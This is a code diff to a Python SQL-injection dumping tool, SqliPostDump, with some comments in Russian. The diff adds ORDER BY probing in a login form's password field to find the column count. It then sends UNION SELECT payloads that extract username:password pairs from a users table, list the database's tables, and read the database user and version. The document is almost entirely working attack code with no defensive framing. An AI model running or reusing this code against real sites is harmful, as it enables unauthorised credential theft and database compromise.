@@ -90,9 +90,31 @@ class SqliPostDump:
                     dumped[path] = text[:2000]
                     print(f"  + {path}: {len(text)}b text")
 
-        # 3.2. try to extract users table via union in login form
+        # 3.2. detect column count via ORDER BY
         print()
-        print("[sqli_post_dump] trying union extract via login form")
+        print("[sqli_post_dump] detecting column count via ORDER BY")
+        correct_cols = 0
+        for n in range(1, 15):
+            payload = f"' ORDER BY {n}-- -"
+            data = {form["user_field"]: "admin", form["pass_field"]: payload}
+            r = http.post(url, data=data, allow_redirects=True)
+            if not r:
+                break
+            low = r.text.lower()
+            # ORDER BY n успешно = нет SQL ошибки
+            has_error = any(m in low for m in ["sql syntax", "order by", "unknown column",
+                                                "invalid", "syntax error", "sqlstate"])
+            if has_error:
+                correct_cols = n - 1
+                break
+        if correct_cols == 0:
+            # fallback: пробуем UNION с 1..10
+            correct_cols = self._find_union_cols(http, url, form)
+        print(f"[sqli_post_dump] columns: {correct_cols}")
+
+        # 3.3. try to extract via union with correct column count
+        print()
+        print("[sqli_post_dump] extracting via union")
         for expr, label in [
             ("(SELECT GROUP_CONCAT(username||':'||password) FROM users)", "users"),
             ("(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables)", "tables"),
@@ -100,7 +122,7 @@ class SqliPostDump:
             ("user()", "user"),
             ("version()", "version"),
         ]:
-            for n in range(1, 8):
+            for n in [correct_cols] if correct_cols > 0 else range(1, 8):
                 cols = ",".join([expr if i == 0 else "NULL" for i in range(n)])
                 payload = f"' UNION SELECT {cols}-- -"
                 data = {form["user_field"]: "admin", form["pass_field"]: payload}
